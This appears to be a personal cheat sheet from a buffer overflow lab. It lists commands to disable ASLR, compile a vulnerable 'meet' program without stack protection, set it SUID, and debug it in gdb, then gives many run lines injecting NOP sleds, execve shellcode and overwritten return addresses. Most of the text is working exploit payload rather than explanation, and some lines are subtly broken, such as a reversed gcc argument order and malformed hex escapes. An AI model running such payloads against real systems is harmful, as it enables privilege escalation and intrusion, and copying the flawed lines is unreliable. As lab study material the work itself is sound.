
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space     // To disable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space     // To enable ASLR

sudo apt install gcc-multilib g++-multilib      // To compile for 32 bit binary 

//In root mode compile the program and set SUID by typing the command chmod u+s meet
gcc -g -o 'sourcefilename.c' 'outputfilename'     // g for debugging symbols and o for output filename
gcc meet.c -o meet -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -g -m32       // For 32 bit binary
gcc meet.c -o meet -fno-stack-protector -z execstack -g        // for easy buffer overflow attack, default 64 -m64 can also be used


gdb -q 'outputfilename'       //q for not printing version
run         // to run the debugger
q      // to quit


info reg rip|eip|pc
info reg rbp|ebp
info reg rsp|esp
info frame

b <line number> // To insert break point
b <function name>
clear // To delete breakpoints
delete // To delete breakpoints

set disassembly-flavor <intel/att>
disassemble <function name>
list


x/400x $sp - 500 // Memmory data organised from low address to higher address Big Endian Form


run Mr `perl -e 'print "A" x 414'` //For buffer overflow attack 64 bit - 412 for 32bit
run Mr `perl -e 'print "\x90" x 414'`
run Mr `perl -e 'print "\x90"x275';``cat sc``perl -e 'print "\xdc\xd5\xff\xff"x38';`         //235 + 25 + 152(4*38) = 412
run Mr `perl -e 'print "\x90"x233';``cat sc``perl -e 'print "\xe0\xe1\xff\xff\xff\x7f"x26';` //233 + 25 + 156(6*26) = 414

run Mr `perl -e 'print "A" x 404'``perl -e 'print "B" x 4'``perl -e 'print "C" x 4'` //412 to overflow
run Mr `perl -e 'print "x90" x 381'``\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`
                `perl -e 'print "\x41\x41\x41\x41"'`  //381 + 27 + 4


run Mr $(python -c 'print "\x90" * 381 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + 
                   "\x41\x41\x41\x41" * 187')

To overflow the buffer 
 [buffersize] + 8 + 6 in bytes
 
wc -c sc
 
0xbffff6d0

run Mr `perl -e 'print "\x90" x 276'``cat sc``perl -e 'print "A" x 16'`

run Mr `perl -e 'print "\x90" x 276'``cat sc``perl -e 'print "\xd0\f6\ff\bf" x 4'`

run Mr `perl -e 'print "\x90" x 267'``cat sc``perl -e 'print "\xd0\xf6\xff\xbf" x 6'`


